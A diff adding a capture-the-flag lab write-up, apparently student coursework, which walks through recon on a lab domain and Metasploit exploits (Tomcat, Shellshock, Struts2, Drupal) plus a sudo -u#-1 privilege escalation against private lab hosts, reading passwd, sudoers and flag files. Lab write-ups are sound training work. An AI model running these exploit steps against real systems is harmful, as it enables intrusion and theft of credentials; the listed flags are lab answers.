@@ -132,5 +132,192 @@ dkkdudfkdy23
 ksdnd99dkas
 ```
 
+# Linux Scavenger Hunt
+
+## Reconnaissance
+
+### Flag 1: 
+![image](https://github.com/user-attachments/assets/93f04dc9-ea72-41f1-89aa-cecb1134f9d1)
+</br>
+```shell
+whois totalrekall.xyz
+
+h8s692hskasd
+```
+
+### Flag 2: 
+![image](https://github.com/user-attachments/assets/e1ba58ac-2a94-4fd1-9e11-d657468a7892)
+</br>
+```shell
+13.248.243.5
+76.223.105.230
+```
+
+### Flag 3: 
+![image](https://github.com/user-attachments/assets/b1e36ae2-fcc4-4df8-a0dd-46d5e34f5afd)
+</br>
+```shell
+s7euwehd
+```
+
+## Scanning
+
+### Flag 4: 
+![image](https://github.com/user-attachments/assets/e0af27f3-bfd5-4347-bb7f-704f982e3bc2)
+</br>
+```shell
+nmap -sV 192.168.13.0/24
+
+5
+```
+
+### Flag 5: 
+![image](https://github.com/user-attachments/assets/a80bc39d-7815-4154-82b9-6a4fb9d3bd13)
+</br>
+```shell
+nmap -A 192.168.13.0/24
+
+192.168.13.13
+```
+
+### Flag 6: 
+![image](https://github.com/user-attachments/assets/12335a62-3ddb-453e-9837-8484fa3439b9)
+![image](https://github.com/user-attachments/assets/047cae8e-a15e-43b8-9dfe-bf5b14600a6c)
+</br>
+```shell
+Nessus Advance Scan
+
+97610
+```
+
+## Exploit
+
+### Flag 7: 
+![image](https://github.com/user-attachments/assets/6382fda5-9f6a-4319-bb29-87a712327d06)
+![image](https://github.com/user-attachments/assets/8e054655-615f-4f23-ad22-62baa9d81e43)
+![image](https://github.com/user-attachments/assets/e213ccf5-5d3d-40db-9f65-79c22c72f0fe)
+</br>
+```shell
+msfconsole
+
+search tomcat jsp
+
+use 5
 
 
+
+set RHOSTS 192.168.13.10
+
+run
+
+cd /root
+
+ls -alt
+
+cat .flag7.txt
+
+8ks6sbhss
+```
+
+### Flag 8: 
+
+![image](https://github.com/user-attachments/assets/a385776d-e845-4bb1-8250-b498407bb6a6)
+![image](https://github.com/user-attachments/assets/13faad45-49b3-4c05-b8b9-dcd4a10c24d5)
+</br>
+```shell
+msfconsole
+
+search shock
+
+use exploit/multi/http/apache_mod_cgi_bash_env_exec
+
+set RHOST 192.168.13.11
+
+set TARGETURI /cgi-bin/shockme.cgi
+
+cd /etc
+
+ls -l
+
+cat sudoers
+
+9dnx5shdf5
+```
+
+### Flag 9: 
+
+![image](https://github.com/user-attachments/assets/2d74a8a2-dee1-4afb-857e-b4d70755e321)
+</br>
+```shell
+cat passwd
+
+wudks8f7sd
+```
+
+## Exploit
+
+### Flag 10: 
+
+
+![image](https://github.com/user-attachments/assets/dcae3cba-d3ce-4863-9516-6b559ebc9797)
+![image](https://github.com/user-attachments/assets/c62f14f0-8ff1-4153-a99f-17f9a81afa29)
+</br>
+```shell
+search apache struts
+
+use exploit/multi/http/struts2_content_type_ognl
+
+set RHOSTS 192.168.13.12
+
+run
+
+cd /root
+
+ls -alt
+
+cat flagisinThisfile.7z
+
+wjasdufsdkg
+```
+
+### Flag 11: 
+
+![image](https://github.com/user-attachments/assets/5afb0fdd-2812-4554-ba6e-9dfd3cd34218)
+![image](https://github.com/user-attachments/assets/58888177-6a20-4e96-b253-c0201814a902)
+</br>
+```shell
+search drupal rce
+
+use exploit/unix/webapp/drupal_restws_unserialize
+
+options
+
+set LHOST 192.168.13.1
+
+set RHOSTS 192.168.13.13
+
+run
+
+shell
+
+whoami
+
+www-data
+```
+
+### Flag 12: 
+
+![image](https://github.com/user-attachments/assets/824d9581-790c-414b-9aec-7f27a9cf88b6)
+![image](https://github.com/user-attachments/assets/1cab7176-d426-49eb-b059-ee24301b7994)
+</br>
+```shell
+ssh alice@192.168.13.14
+
+password: alice
+
+sudo -u#-1 find / -type f -iname "*flag*"
+
+sudo -u#-1 cat /root/flag12.txt
+
+d7sdfksdf384
+```
